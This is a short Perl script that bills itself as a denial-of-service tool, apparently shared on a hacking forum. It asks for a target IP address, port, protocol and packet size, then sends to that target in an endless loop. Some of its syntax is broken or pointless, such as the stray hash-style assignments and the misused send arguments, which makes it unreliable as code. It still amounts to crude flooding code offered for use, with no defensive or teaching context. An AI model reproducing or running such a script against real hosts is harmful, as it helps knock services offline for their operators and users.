#!/usr/bin/perl

print q{

+-===-===-===-===-===-===-===-===-===-===-===-===-===-+
|      W A R N I N G :   M I G H T   H U R T ! ! !    |
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-+
\  WhoHacksAnymores Sketchy Denial of Service Script  /
 \              ~~~~~~~~~~~~~~~~~~~~~~               /
  \      The unofficial perl DoS script of HF!      /
   \              Warning: might Hurt!             /
    +-===-===-===-===-===-===-===-===-===-===-====+

Welcome. Please enter the credentials below:

};

use IO::Socket::INET;

print "Internet Protocol Address: ";
chop ($host = <stdin>);
print "Port Number: ";
chop ($port = <stdin>);
print "Method TCP/UDP: ";
chop ($protocol = <stdin>);
print "Byte Size: ";
chop ($size = <stdin>);

print q{
Strike a key when ready...
};
<>;
{
$sock = IO::Socket::INET->new (
  PeerAddr => $host,
  PeerPort => $port,
  Proto => $protocol) 
        || die "the IP or PORT is incorrect, please check the IP and PORT";
}
packets:
while (1) {
size => $size;
$Reuse => 1,
$Listen => 1,
print ("$host:$port packet size: $size\n");
send($sock, $size, $Reuse, $Listen);
} 
